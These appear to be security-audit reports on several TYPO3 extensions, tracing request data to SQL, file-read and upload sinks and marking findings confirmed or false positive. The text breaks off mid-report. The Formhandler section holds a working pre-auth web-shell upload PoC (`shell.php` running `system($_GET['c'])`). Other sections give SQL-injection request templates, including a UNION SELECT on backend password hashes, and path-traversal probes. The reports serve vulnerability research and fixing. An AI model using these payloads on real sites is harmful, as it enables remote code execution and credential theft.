#### maispace/mai-assets — `Classes/Middleware/StaticFileServeMiddleware.php`

## Verdict: FALSE POSITIVE (arbitrary file read is confined)

The reported traversal at line 119 (`file_get_contents($filePath)`) is blocked by the
combination of: (a) `GeneralUtility::resolveBackPath()` textual `../` collapse **before**
the prefix check, (b) a `str_starts_with($path, $baseDir)` guard applied **twice**, and
(c) a hard-coded `/index.html` suffix on every resolved path — an attacker cannot name an
arbitrary target file even in a hypothetical prefix bypass.

---

## 1. Sink and the path argument
```php
StaticFileServeMiddleware.php:119   $content = file_get_contents($filePath);   // READ
```
`$filePath` comes from `resolveCacheFilePath()` (line 100) and is post-processed by
`resolveContentEncoding()` (line 113), which only ever appends `.br` / `.gz`.

## 2. Backward taint trace + confinement
```
:83   $requestUri = (string)$request->getUri();          // attacker-influenced path
:100  $filePath = resolveCacheFilePath($pageUid,$languageUid,$requestUri)
:162  resolveCacheFilePath:
        primary : getPageDirectoryById((int)$pageUid,(int)$languageUid)  // ints only — no taint
        fallback: getPageDirectory($requestUri)                          // uses URL path
      then guard: str_starts_with($filePath, $baseDir)   (:171 and :184)
:119  file_get_contents($filePath)
```

**Fallback path — `StaticFileCacheDirectory::getPageDirectory()`:**
```
buildRelativePagePath: {scheme}_{host}_{port}/{ trim(parse_url(uri)['path'],'/') }/
resultPath = GeneralUtility::resolveBackPath($baseDir . $relative)   // collapses ../ TEXTUALLY
if (!str_starts_with($resultPath, $baseDir)) throw InvalidArgumentException  // guard AFTER resolution
```
`resolveBackPath` resolves `xxx/../` sequences first, and only then is the prefix compared
against `$baseDir` (itself `resolveBackPath`-normalized, ending in `/`). A payload such as
`/../../../../etc/passwd` collapses to a path that no longer starts with `$baseDir`, so
`getPageDirectory` throws → caught in `resolveCacheFilePath` → returns `null` → middleware
falls through (`handler->handle`). This is the correct order (resolve-then-check), not the
broken check-then-use pattern.

**Primary path** uses `(int)$pageUid` / `(int)$languageUid` only → `{base}/{int}_{int}/` — no
string taint at all.

**Filename is fixed:** every resolved path ends in `/index.html`
(`StaticHtmlWriterService::INDEX_FILENAME`, lines 170/183), with at most a `.br`/`.gz`
suffix. Even if a prefix-collision bypass of `str_starts_with` were constructed, the read is
constrained to a file literally named `index.html[.br|.gz]` — `/etc/passwd` and friends are
unreachable.

`isValidUri` (line 180 / StaticFileCacheDirectory) additionally requires a full absolute URL
with scheme + host + path via `GeneralUtility::isValidUrl`, and the host segment is the
server's own host, not an arbitrary attacker string.

## 3. Reachability / auth level
`Configuration/RequestMiddlewares.php` → `frontend` stack, `after
maispace/mai-assets/early-hints`. **Pre-auth** (no session gate). Guarded by:
- `isEnableStaticFileCache()` extension config must be on (else pass-through, line 68) —
  so exploitation would even require the feature enabled (**NEEDS-CONFIG** just to reach the
  sink), and
- `GET` only, no query string (lines 72/86).

Even fully enabled and unauthenticated, the traversal is confined as shown above.

## 4. Version / compat
`ext_emconf.php`: version **1.0.0**, requires **TYPO3 12.4.0–14.99.99**.

---

## Why not CONFIRMED
- `resolveBackPath()` normalizes `../` **before** the `str_starts_with($baseDir)` guard
  (StaticFileCacheDirectory: getPageDirectory / getPageDirectoryById), and the guard is
  repeated in the middleware (lines 171, 184).
- The target filename is hard-coded `/index.html` (+`.br`/`.gz`), so no arbitrary filename
  can be read even if the directory prefix check were somehow defeated.
- Primary lookup is integer-only; fallback host segment is server-controlled.
- Fail-open `catch (\Throwable)` (line 122) turns any resolution failure into a harmless
  pass-through, not a leak.

## Representative request (does NOT escape)
```
GET /../../../../etc/passwd HTTP/1.1
Host: victim
Accept-Encoding: identity
```
`resolveBackPath` collapses the `../` to a path outside `$baseDir`; the guard throws;
`resolveCacheFilePath` returns `null`; the middleware delegates to normal TYPO3 rendering.
No arbitrary read.

### maispace_mai-faq

#### maispace_mai-faq — FaqApiMiddleware

**Extension:** Mai Faq v1.0.0 — TYPO3 `13.4.0-14.99.99`
**File:** `Classes/Middleware/FaqApiMiddleware.php:140`

## Verdict: FALSE POSITIVE

Line 140 is `->orderBy('f.' . $sort, $order);` — string concatenation into an ORDER BY, which is why CodeQL flagged it. But **both concatenated values are strictly whitelisted**, so no request-controlled data reaches the SQL.

### Tainted chain and why it is neutralized
- `:120` `$params = $queryParams ?? $request->getQueryParams();` (GET params, taint source)
- `:123` `$sort = $this->resolveSortField($params['sort'] ?? 'sorting');`
  - `resolveSortField()` (`:275-280`): `strtolower(trim($field))` then `in_array($field, ['sorting','question','uid'], true) ? $field : 'sorting'`. **Strict whitelist**; anything else collapses to `'sorting'`. The value concatenated at `:140` can only ever be one of three hardcoded column names.
- `:124` `$order = $this->resolveSortOrder($params['order'] ?? 'asc');`
  - `resolveSortOrder()` (`:286-289`): returns literal `'DESC'` or `'ASC'` only. Not attacker-controlled.
- `:140` `->orderBy('f.' . $sort, $order)` — both operands are safe constants. **No injection.**

### Every other input is parameterized
- `:121` `categoryUid` → `(int)` cast, then `createNamedParameter(..., Connection::PARAM_INT)` at `:349`.
- `:122-129` `pageUids` → `explode` + `array_map('intval')` + `>0` filter, then `createNamedParameter(..., Connection::PARAM_INT_ARRAY)` at `:144`.
- `:137-138` hidden/deleted → `expr()->eq('f.hidden', 0)` constants.
- `addLanguageConstraint` (`:307-326`) → `createNamedParameter(... PARAM_INT_ARRAY / PARAM_INT)`.
- `addCategoryJoin` (`:331-353`) → all values via `createNamedParameter`.
- `handleCategories` (`:189-226`): `categoryUids` → `intval` + `>0` filter → `createNamedParameter(... PARAM_INT_ARRAY)` at `:212`.
- `attachCategoryData` (`:361-406`): uids from prior int-cast rows → `createNamedParameter(... PARAM_INT_ARRAY)`.

No `->where($rawString)`, no `->add('where', ...)`, no `exec_SELECT*`, no string-concatenated WHERE/LIKE. The only concatenation (ORDER BY) uses whitelisted tokens. `createNamedParameter` / int-casts neutralize all user input.

## Reachability / auth
- Registered in `Configuration/RequestMiddlewares.php` under `frontend`, `after: typo3/cms-frontend/site`. **Unauthenticated frontend PSR-15 middleware.**
- `AbstractApiMiddleware::process` (`maispace_base/.../AbstractApiMiddleware.php:25-38`) — no auth/login/token check; calls `handle()` when `shouldHandle()` is true.
- Activation: `shouldHandle()` (`:75-78`) matches any request path starting with `/api/faq`. So the endpoint IS pre-auth reachable — but there is **no injectable sink**, so reachability does not create a vulnerability.

## Trigger (for completeness — returns data, no injection)
```
GET /api/faq/items?sort=question&order=desc&categoryUid=1&pageUids=1,2 HTTP/1.1
Host: victim
```
Attempting `sort=uid;DROP...` or `order=asc--` is discarded by the whitelist/normalizer (`sort` falls back to `sorting`, `order` falls back to `ASC`).

## Bottom line
Pre-auth reachable but not exploitable. The ORDER BY concatenation is guarded by a strict column whitelist and a DESC/ASC normalizer; all other inputs are int-cast and bound via `createNamedParameter`. **No SQL injection.**

### mia3_mia3_categories

#### mia3_mia3_categories — CategoryController.php:48 (indexAction)

## Verdict: CONFIRMED SQL injection — auth-required (authenticated backend user)

**Sink (line 45-51):**
```php
40  public function indexAction() {
41      $where = '1=!';
42      if (isset($_GET['id'])) {
43          $where = 'pid = ' . $_GET['id'];        // <-- raw concatenation, no intval/quote
44      }
45      $categories = $GLOBALS['TYPO3_DB']->exec_SELECTgetRows(
46          '*',
47          'sys_category',
48          $where . ' AND deleted = 0' . BackendUtility::BEenableFields('sys_category'),
49          '', 'sorting'
50      );
```

`$_GET['id']` is concatenated directly into the WHERE clause of a raw `exec_SELECTgetRows()`. No `intval()`, no `quote()`, no `createNamedParameter()`. Classic SQL injection.

## Tainted chain
`$_GET['id']` (CategoryController.php:42-43) → `$where` → `exec_SELECTgetRows(..., $where ...)` (CategoryController.php:45-48).

## Reachability / auth
**Backend module only.** `ext_tables.php` registers it via `ExtensionUtility::registerModule('Mia3....', 'web', 'txmia3categoriesmod1', ..., ['Category' => 'index,updateSorting,batchCreate'], ['access' => 'user,group'])` and the whole block is guarded by `TYPO3_MODE === 'BE'`. There is **no** `configurePlugin` / FE plugin / eID registration. The controller also assigns `$_GET['moduleToken']` to the view, confirming backend-module context. Reaching `indexAction` therefore requires an authenticated **backend user** with access to the module (`access => user,group`).

Not pre-auth. This is an authenticated-backend-user SQL injection (privilege-escalation / data-exfil primitive for any BE user who has the module, including non-admin editors).

## Exact request (authenticated BE session)
```
GET /typo3/index.php?route=/module/web/Mia3Mia3categoriesTxmia3categoriesmod1
    &tx_mia3categories_web_mia3mia3categoriestxmia3categoriesmod1[controller]=Category
    &id=0) UNION SELECT ... -- -
```
i.e. supply `&id=<SQL>` (e.g. `id=1 AND (SELECT ...)` or `id=0) UNION SELECT username,password,... FROM be_users-- -`) while logged into the backend module.

## Version
`version => 0.0.0`, `state => alpha`. Uses legacy `$GLOBALS['TYPO3_DB']` (TYPO3 6/7-era API).

### oliverklee_realty

#### Security Audit — oliverklee/realty (Realty Manager) v3.0.2

**Target eID:** `realty` (AJAX dispatcher)
**TYPO3 constraint:** 7.6.23–8.7.99 / PHP 5.5–7.2
**Focus:** SQL injection (legacy raw WHERE), reflected XSS in search, IDOR
**Verdict:** No exploitable pre-auth vulnerability found via the eID. The dispatcher casts its only attacker input to `(int)`, and the district title output is HTML-encoded. An unsafe raw-concatenation WHERE clause exists downstream but is unreachable with tainted data because of the int cast.

---

## Summary

`ext_localconf.php` registers the eID pre-auth:

```php
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['realty'] = 'EXT:realty/Ajax/tx_realty_Ajax_Dispatcher.php';
```

`Ajax/tx_realty_Ajax_Dispatcher.php` exposes exactly one action — a city→district drop-down:

```php
$cityUid = (int)\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('city');   // int cast
$showWithNumbers = (\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('type') === 'withNumber');  // strict bool
if ($cityUid > 0) {
    $output = \tx_realty_Ajax_DistrictSelector::render($cityUid, $showWithNumbers);
}
```

Both request parameters are neutralized at the source (`(int)` and an `=== 'withNumber'` boolean), so no attacker-controlled string reaches any downstream sink. The SQLi / XSS / IDOR hunt on this eID is disproven below with the exact sinks.

---

## Analysis

### SQL injection — sink exists but is unreachable (NOT exploitable)

`DistrictSelector::render()` calls the mapper:

```php
foreach ($districtMapper->findAllByCityUid($cityUid) as $district) { ... }
```

**Unsafe sink** — `Mapper/class.tx_realty_Mapper_District.php:findAllByCityUid()`:
```php
public function findAllByCityUid($uid)
{
    return $this->findByWhereClause('city = ' . $uid, 'title ASC');   // raw concatenation
}
```

This is textbook unsafe string concatenation into a WHERE clause. **However**, the only caller reachable from the eID is the dispatcher, which passes `$cityUid = (int)_GET('city')`. An integer cannot carry SQL metacharacters, so the injection is not reachable pre-auth. `$cityUid` also gates on `> 0`. There is no code path from the eID that feeds a non-integer into `findAllByCityUid`.

`countByDistrict()` (Mapper/class.tx_realty_Mapper_RealtyObject.php) takes a `tx_realty_Model_District` object and an `$additionalWhereClause` that defaults to `''` and is not attacker-controlled on this path.

### Reflected XSS in the rendered list (NOT exploitable)

`DistrictSelector::render()` HTML-encodes both dynamic values:
```php
$options .= '<option value="' . $district->getUid() . '">' .   // uid is int from DB
    htmlspecialchars($district->getTitle()) .                  // encoded
    $displayedNumber . "</option>\n";
```
`getUid()` returns an integer DB uid and `getTitle()` is passed through `htmlspecialchars()`. No reflected request value is echoed into the response — the `city`/`type` inputs never appear in `$output`. No XSS.

### IDOR (NOT a meaningful finding)

The endpoint only enumerates public district records belonging to a city uid. There is no per-object authorization to bypass and no sensitive data returned (district title + public object counts), so there is no consequential IDOR.

---

## PoC

None. `GET /index.php?eID=realty&city=1%20OR%201=1&type=withNumber` is evaluated as `city = 0` (the `(int)` cast turns `"1 OR 1=1"` into `1`, and any non-numeric string into `0`), so no injection occurs; a numeric `city` simply returns that city's district `<option>` list with encoded titles.

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `realty` / `oliverklee/realty` at v3.0.2 concerning this eID. (Oliver Klee has issued advisories for other extensions, e.g. TYPO3-EXT-SA-2022-006 for `seminars`, but none applicable here.) The raw-WHERE concatenation in `findAllByCityUid` should still be hardened defensively (`intval`/quoting) in case another caller ever passes untrusted input.

**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [oliverklee/ext-realty (GitHub)](https://github.com/oliverklee/ext-realty)

### oliverklee_seminars

#### oliverklee / seminars — DefaultController & RegistrationManager

**Verdict: FALSE POSITIVE (no code-injection sink at any cited line)**

None of the flagged lines contain a dynamic callable/class/include/eval/unserialize sink. Each is either a type `\assert()` on an object instance or a constant callable.

## Cited lines
- `Classes/FrontEnd/DefaultController.php:385` — `\assert($event instanceof LegacyEvent);` — boolean type assertion, **not** a string `assert('code')`. No eval.
- `:598` — `\assert($this->seminar instanceof LegacyEvent);` — same.
- `:1413` — `\assert($this->seminar instanceof LegacyEvent);` — same.
- `:1777` — `array_map([$this, 'pi_getClassName'], $classes);` — a **constant** callable `[$this, 'pi_getClassName']` (literal method name). Attacker controls neither the callable nor the class; only array *values* (CSS-class strings) flow as arguments to a fixed method. Not injection.
- `:1917` — `\assert($this->cObj instanceof ContentObjectRenderer);` — boolean type assertion.
- `Classes/Service/RegistrationManager.php:206` — `\assert($contentObject instanceof ContentObjectRenderer);` — boolean type assertion.

The `assert()` calls receive boolean expressions, so even with `zend.assertions`/`assert.active` enabled there is no string-eval path (string-eval only occurred for `assert('literal-code-string')`, which is not used here). These are almost certainly line numbers a naive scanner mapped to "eval-like `assert`" and "`call_user_func`-like `array_map`".

## Reachability / auth
`DefaultController` renders on the public FE (anonymous), but there is no controllable sink, so reachability is moot.

## Version
Seminar Manager **6.0.x-dev**, TYPO3 `11.5.41–12.4.99`, PHP `7.4–8.4`.

### pagemachine_ats

#### pagemachine_ats — AjaxApplicationRepository SQL injection

**Verdict: CONFIRMED — auth-required (backend user) SQL injection in ORDER BY. NOT pre-auth.**
The CodeQL "anonymous applicant" hypothesis is **refuted**: this repository is reachable only through a backend-module AJAX route, never from the anonymous frontend applicant flow.

## Sink

`Classes/Domain/Repository/AjaxApplicationRepository.php`, method `findWithQuery()`:

```php
->setFirstResult( $query->getOffset() )        // line 88
->setMaxResults( $query->getLimit() )          // line 91
->orderBy(
    $query->getOrderBy(),                      // line 94  <-- raw string identifier
    $query->getOrderDirection()                // line 95  <-- raw string direction
);
```

- **Lines 88 / 91 (offset / limit): not exploitable.** `offset` and `limit` are `(int)`-cast in the `ApplicationQuery` constructor (`ApplicationQuery.php:259-260`), and `setFirstResult`/`setMaxResults` emit integer LIMIT/OFFSET. False alarms.
- **Lines 94 / 95 (orderBy field + direction): the real injection.** Both are plain strings copied verbatim from request input with no cast, no allow-list, no `createNamedParameter`. TYPO3 `QueryBuilder::orderBy()` `quoteIdentifier`s only the field name; the **sort direction is concatenated into the SQL raw**, and the field name is not validated against a column allow-list. Attacker-controlled SQL fragment reaches the ORDER BY clause.

The parameterized constraints in `buildQueryConstraints()` (lines 108-133, all `createNamedParameter`) are safe and are not the issue.

## Tainted chain (request -> sink)

1. Backend AJAX route `ats_applications_list` -> `AjaxApplicationController::getApplications`
   `Configuration/Backend/AjaxRoutes.php:4-6`
2. `$body = $request->getParsedBody();` -> `new ApplicationQuery($body['query'])`
   `Classes/Controller/Backend/AjaxApplicationController.php:21,23`
3. `ApplicationQuery::__construct()` copies input **unsanitized**:
   `$this->orderBy = $queryParams['orderBy'] ?: $this->orderBy;`  `ApplicationQuery.php:257`
   `$this->orderDirection = $queryParams['orderDirection'] ?: $this->orderDirection;`  `ApplicationQuery.php:258`
4. `getApplications` calls `$repository->findWithQuery($query)`
   `AjaxApplicationController.php:30`
5. `findWithQuery()` -> `->orderBy($query->getOrderBy(), $query->getOrderDirection())`
   `AjaxApplicationRepository.php:93-96` (sink lines 94, 95)

No sanitizer anywhere on `orderBy` / `orderDirection` between request and sink.

## Reachability / auth — CRUCIAL

- The **only** caller of `AjaxApplicationRepository` is `Controller/Backend/AjaxApplicationController` (verified: no other reference; the repo's own comments say "called in BE context" and it reads `$GLOBALS['BE_USER']`).
- The **only** input-fed `new ApplicationQuery($body['query'])` is that backend controller. The other instantiations use defaults or `$GLOBALS['BE_USER']->uc` session data (`ApplicationController.php:156`, `ApplicationQuery::buildFromSession`).
- Route is `Configuration/Backend/AjaxRoutes.php` (a **backend** AJAX route), path `/ats/applications`, with **no `access => public`** key -> the TYPO3 backend RouteDispatcher requires a valid `be_user` session and route token. **Authenticated backend endpoint, not pre-auth.**
- There is **no** eID / frontend plugin / anonymous applicant path into this repository. The public applicant flow (`Classes/Controller/Application/*`) does not touch `AjaxApplicationRepository`.

So: exploitable, but only by an authenticated backend user (any BE user who can reach the applications list module). A low-privilege editor with backend access is enough — it is a privilege/data-integrity issue, not a pre-auth RCE-adjacent SQLi.

## Exact request to trigger

Authenticated backend user, POST to the backend AJAX endpoint:

```
POST /typo3/index.php?route=/ats/applications&token=<valid-route-token> HTTP/1.1
Cookie: be_typo_user=<valid BE session>
Content-Type: application/x-www-form-urlencoded

draw=1&query[orderDirection]=<SQL>&query[orderBy]=application.uid
```

`query[orderDirection]` (and/or `query[orderBy]`) carries the injected SQL that lands in the ORDER BY clause. Example payload for the direction: `ASC, (SELECT ... )` style sub-select / stacked expression exfiltration via ordering.

## Version

`ext_emconf.php`: **pagemachine_ats 2.0.1**, `state = stable`.
Constraints: PHP `7.2.0-7.4.99`, TYPO3 `9.5.0-9.5.99`, static_info_tables `6.7.0-6.99.99`.

### phorax_formhandler

#### Security Audit — `phorax/formhandler` (TYPO3 Formhandler)

- **Target:** `/home/user/sources/code/typo3-extensions/phorax_formhandler`
- **Extension key:** `formhandler`  ·  **Composer:** `phorax/formhandler`
- **Version / platform:** TYPO3 v11.5 fork (constraint `typo3 11.5.0-11.99.99`, `typo3/cms-core ^11.5`). This is the modern MVC rewrite (Doctrine DBAL / `QueryBuilder`), not the legacy `TYPO3_DB->exec_*` codebase.
- **Pre-auth entry points (eID, frontend, unauthenticated):**
  - `formhandler` → `Classes/Http/Validate.php` → `Ajax\Validate`
  - `formhandler-removefile` → `Classes/Http/RemoveFile.php` → `Ajax\RemoveFile`
  - `formhandler-ajaxsubmit` → `Classes/Http/Submit.php` → `Ajax\Submit`
  - Plus the normal frontend plugin (`CType`/USER cObject) `Controller\Form::process()`.

## Summary

The classic Formhandler injection surfaces (DB finisher, `IsInDBTable`/`IsNotInDBTable` validators, update `andWhere`) have been **rewritten to use Doctrine `QueryBuilder` with `createNamedParameter()`** and are no longer injectable. The `unserialize()` sites operate on self-serialized arrays from the extension's own log table (not attacker-supplied serialized objects) and the `eval()` in the conditions block only concatenates `TRUE`/`FALSE` tokens — neither is exploitable.

The **one concrete, pre-auth, high-impact finding is an unrestricted file upload** (F1): the form controller's `processFiles()` iterates *every* `$_FILES` entry in the request — not only declared form fields — and moves each into the **web-accessible** `uploads/formhandler/tmp/` folder **keeping the client-supplied extension**, with **no file-type allow-list applied by default** and, critically, **the move is not gated by the per-field validator** when the attacker uploads under an arbitrary (unvalidated) field name. On any site that runs a Formhandler form (i.e. essentially every install — a contact form is enough) an unauthenticated attacker can drop a `.php` file into the document root. Whether the dropped file executes depends on the web server allowing PHP in `uploads/` (common on legacy/non-hardened TYPO3 v11 setups; the extension ships **no `.htaccess`** protecting the folder). Two lower-severity, configuration-dependent items (F2 SQLi in `LoadDB`, F3 reflected XSS in the validate eID) are documented for completeness.

---

## F1 — Unrestricted / arbitrary file upload to web root (pre-auth)  → RCE

- **SEVERITY:** HIGH → CRITICAL (RCE where `uploads/` executes PHP)
- **PRE-AUTH:** Yes. Reachable via the normal frontend form submit and via the `formhandler-ajaxsubmit` eID (`Classes/Http/Submit.php`), both unauthenticated.
- **Source:** `$_FILES` (attacker-controlled multipart part name **and** filename)
  `Classes/Controller/Form.php:707` — `foreach ($_FILES as $sthg => $files)`
- **Sink:** `Classes/Controller/Form.php:766` — `move_uploaded_file($files['tmp_name'][$field][$idx], $uploadPath . $uploadedFileName);`
- **Supporting code:**
  - Default upload folder is web-root relative: `Classes/Utility/GeneralUtility.php:712` → `$uploadFolder = '/uploads/formhandler/tmp/'`; made absolute with `getTYPO3Root()` (`GeneralUtility.php:68-73`, document root).
  - Filename kept verbatim except spaces→`_`: `doFileNameReplace()` (`GeneralUtility.php:885-922`) performs **no** extension or path sanitisation by default. The extension is preserved: `$ext = substr($name, strpos($name, '.'))`, `$uploadedFileName = $filename . $ext` (`Form.php:744-750`).
  - **Per-field gate is bypassable:** the only guard before the move is `if (!isset($this->errors[$field]))` (`Form.php:720`). Validators (incl. `FileAllowedTypes`, `Classes/Validator/ErrorCheck/FileAllowedTypes.php`) are bound to *named* form fields in TypoScript. Uploading under a field name that is not present in any validator config yields no error → the move proceeds. So even a form that correctly sets `allowedTypes` on its real upload field is bypassed by using a different part name.
  - The move runs on submit **regardless of overall form validity** — `processFiles()` is called at `Form.php:326-328`, *before and outside* the `isValid()` branch at `Form.php:331`.
  - No default restriction ships: `ext_typoscript_setup.typoscript` sets no `files.uploadFolder`/`allowedTypes`; no `FileAllowedTypes` is applied by default; and there is **no `.htaccess`** anywhere under the extension (checked) protecting `uploads/formhandler/tmp/`.
- **Tainted path:** HTTP multipart POST → `$_FILES[<any>]['name'][<any field>]` → `processFiles()` loop (no field-existence check) → `doFileNameReplace()` (spaces only) → `move_uploaded_file(uploadPath . <name.ext>)` → file written under `<docroot>/uploads/formhandler/tmp/` and directly reachable at `https://site/uploads/formhandler/tmp/<name.ext>`.
- **Exploitability:** High. Requirements: (1) any page rendering a Formhandler form (single-step, the default; `currentStep >= lastStep` holds — `Form.php:326`); (2) the request marked as a submit (include the form's submit/prefix field); (3) for code execution, the web server must run PHP in `uploads/` (default on many Apache/legacy TYPO3 v11 installs; hardened/composer `public/` setups may block execution but the file still lands and is fetchable → arbitrary file write / stored content).
- **PoC (schematic):**
  ```
  POST /?eID=formhandler-ajaxsubmit&id=<pageWithForm>&uid=<tt_content_uid> HTTP/1.1
  Content-Type: multipart/form-data; boundary=X

  --X
  Content-Disposition: form-data; name="tx_formhandler_pi1[submit]"

  1
  --X
  Content-Disposition: form-data; name="tx_formhandler_pi1[pwn]"; filename="shell.php"
  Content-Type: application/x-php

  <?php system($_GET['c']); ?>
  --X--
  ```
  Then fetch `https://site/uploads/formhandler/tmp/shell.php?c=id`.
  (The part name `tx_formhandler_pi1[pwn]` is an *undeclared* field → no validator error → `move_uploaded_file` writes `uploads/formhandler/tmp/shell.php`.)
- **Fix:** enforce a server-side extension **allow-list on every `$_FILES` entry before the move** (reject `php`, `phtml`, `php5`, `phar`, `htaccess`, …), restrict processing to declared form fields, store uploads outside the web root or behind a deny-all `.htaccess`, and sanitise the filename with `basename()` + TYPO3 `File\BasicFileUtility`/`sanitizeFileName`.

---

## F2 — Potential SQL injection in `LoadDB` preprocessor (config-dependent)

- **SEVERITY:** MEDIUM (HIGH if a GP-driven `where` is configured)  ·  **PRE-AUTH:** Yes (preprocessors run on form load)
- **Sink:** `Classes/PreProcessor/LoadDB.php` — `loadDB()` builds a raw string via `getQuery()` (`$sql = $this->globals->getCObj()->getQuery($table, $conf)`) and runs it with **`$connection->executeQuery($sql)`** (no parameter binding). `getQuery()` only post-processes the `pid` clause with regex; it does not escape values.
- **Tainted path:** The `select.where`/`select.markers` come from TypoScript (admin), but Formhandler resolves them through `getSingle()`/stdWrap, so a config that interpolates GP values (e.g. a marker/`insertData` pulling `GP:` into the `where`) flows unescaped into `executeQuery()`. Not injectable with a static `where`; injectable only when the integrator wires request data into the query.
- **Assessment:** Real dangerous sink (raw `executeQuery` of a cObj-built where), but exploitability depends on site TypoScript. Flagged as a latent hazard, not a self-contained vuln in shipped code.

## F3 — Reflected XSS in `formhandler` (validate) eID (config-dependent)

- **SEVERITY:** MEDIUM  ·  **PRE-AUTH:** Yes
- **Source/Sink:** `Classes/Ajax/Validate.php` — on success/failure it builds `$gp = [ $_GET['field'] => $_GET['value'] ]` and renders it through the AJAX view (`$view->render($gp, $errors)`), then `print`s the result. The field name is `htmlspecialchars`'d into `###fieldname###` (`initView`), but the reflected **value** is rendered into the configured `ajax.config.ok`/`notOk` template markers.
- **Assessment:** Only reached when `settings.ajax.config.ok`/`notOk` content templates are configured (default falls back to a static `<img>` and does not reflect). Where configured, `$_GET['value']` is reflected into HTML → reflected XSS. Config-dependent.

---

## Reviewed and found NOT exploitable (diligence)

- **`formhandler-removefile` eID arbitrary deletion — NEGATIVE.** `Classes/Ajax/RemoveFile.php`: `$_GET['uploadedFileName']` (also `htmlspecialchars`'d) is used **only in `strcmp` matching**; the `unlink()` target is `$uploadPath . $fileInfo['uploaded_name']` / `['name']` taken from the **user's own session** (`RemoveFile.php:93-94, 98-102`). The deleted name is the value stored at upload time (sanitised `uploadedFileName`, or `name` = spaces-replaced original). Path traversal via the stored `name` is blocked because upload rejects names whose first `.` is at offset 0 (`Form.php:744` `strlen($filename) > 0`) and any `../` needs a pre-existing intermediate directory under the upload folder for `move`/`unlink` to resolve. No arbitrary/other-user file deletion.
- **SQL injection in DB finisher / DB validators — NEGATIVE.** `Classes/Finisher/DB.php`, `AutoDB.php`, `Validator/ErrorCheck/IsInDBTable.php`, `IsNotInDBTable.php` all use `QueryBuilder` with `createNamedParameter()` for values; `andWhere`/`additionalWhere` are TypoScript (admin) strings passed through `QueryHelper::stripLogicalOperatorPrefix()`. Field/table identifiers come from config, not request.
- **Object injection via `unserialize()` — NEGATIVE.** `Interceptor/IPBlocking.php:193`, `Controller/Form.php:180`, `Controller/ModuleController.php:132/178/218` unserialize `params` read from the extension's own `tx_formhandler_log` table, which stores `serialize($gp)` — an array of scalar strings whose values the attacker only supplies as *string content*; `serialize()` encodes them safely, so no attacker-crafted object graph reaches `unserialize()`. (`ModuleController` is backend-only regardless.)
- **`eval()` in conditions — NEGATIVE.** `Controller/Form.php:1007` evaluates a string composed solely of `TRUE`/`FALSE`/`&&`/`||`/parentheses derived from boolean `getConditionResult()` outputs; no request data is interpolated into the eval'd string.
- **Arbitrary class instantiation — NEGATIVE.** `getPreparedClassName()`/`getComponent()` class names come from TypoScript in session (`settings.ajax.`, `settings.session.`), which is admin-authored; not request-controlled.

## Known CVEs / advisories

No TYPO3 Security-Team advisory (`TYPO3-EXT-SA-*`) or CVE is on record for `phorax/formhandler` or the original `typoheads/formhandler` covering this code. The unrestricted-upload behaviour (F1) matches the long-standing, documented Formhandler guidance that integrators must lock down the upload folder and set `allowedTypes` — i.e. it is an **insecure-by-default** condition shipped in this version, not a fix that was applied and later regressed. Treat F1 as the actionable, unpatched pre-auth issue.

### phorax_loginusertrack

#### phorax_loginusertrack — LoginusertrackController.php:589

## Verdict: FALSE POSITIVE (sink is whitelisted; module is backend-only regardless)

**Sink (line 589):** `$res = $GLOBALS['TYPO3_DB']->sql_query($query);` inside `showActive()`.

The only request-derived value that reaches this `$query` is the ORDER BY column:

```php
581  $orderBy = GeneralUtility::_GP('orderby');
582  $query = 'SELECT ... FROM fe_users WHERE pid=' . intval($id) .
583      ' AND lastlogin > ' . (time() - $daysBack * 24 * 3600) .
...
587      ' ORDER BY ' . (GeneralUtility::inList('username,name,email,lastlogin',
588          $orderBy) ? $orderBy . ($orderBy == 'lastlogin' ? ' DESC' : '') : 'name');
589  $res = $GLOBALS['TYPO3_DB']->sql_query($query);
```

- `orderby` (_GP) is gated by `GeneralUtility::inList('username,name,email,lastlogin', $orderBy)` — a strict whitelist. A non-matching value falls back to the literal `name`. Not injectable.
- `$id` is `intval()`'d (from `$this->id`, page id).
- `$daysBack` is `MathUtility::forceIntegerInRange(...)` (line 402).

No tainted value survives to the sink at line 589.

## Reachability / auth
Backend-only. The class extends `\TYPO3\CMS\Backend\Module\BaseScriptClass`, module `web_txloginusertrackM1`, dispatched via `mainAction()` behind `main()`'s `BackendUtility::readPageAccess()` + `$GLOBALS['BE_USER']` checks. A valid, authenticated **backend user** is required to reach any code path here. No FE plugin / eID registration exists.

## Note (not the target line, still backend-auth-gated)
`removeOld()` line 459 builds `... AND username="' . addslashes($testUsername) . '"'` from `_GP('test_username')`. `addslashes` inside a double-quoted SQL string is weak, but this is a different line, only reachable by an authenticated backend user with page access, so it is not a pre-auth issue and out of scope for the reported sink.

## Version
`version => 3.0.0`, `TYPO3_version => 7.6.0-8.7.999` (uses legacy `$GLOBALS['TYPO3_DB']`).

### phorax_mydashboard

#### Security Audit — phorax / mydashboard (myDashboard)

- **File:** `Classes/Controller/MydashboardController.php`
- **Version:** (empty in `ext_emconf.php`) — constraint `typo3 => 7.6.0-8.7.99`
- **Type / reachability:** **Backend module, NOT a frontend plugin.** `class MydashboardController extends \TYPO3\CMS\Backend\Module\BaseScriptClass`, registered via `ExtensionManagementUtility::addModule(...)` in `ext_tables.php` (module `user_txmydashboardM1`). Every entry point dereferences `$GLOBALS['BE_USER']->user['uid']` (`:178`, `:228`, `:308`, `:388`). **Access requires an authenticated TYPO3 backend user** — the TYPO3 module dispatcher enforces BE auth before this code runs. This is NOT anonymous / pre-auth surface, contrary to the "same vendor as phorax/formhandler pre-auth upload RCE" framing — that other extension is a frontend upload flow; this one is a gated BE module.

## Summary verdict: no pre-auth exposure; no confirmed vulnerability in scope.

### 1. SQL injection — FALSE POSITIVE (hardened)
Only two SQL sinks, both integer-cast on the current BE user's own uid:
- `showConfig()` `:404` `exec_SELECTquery('*', 'be_users', 'uid=' . intval($user), ...)`
- `:413` `exec_UPDATEquery('be_users', 'uid=' . intval($user), ['uc' => serialize($uc)])`

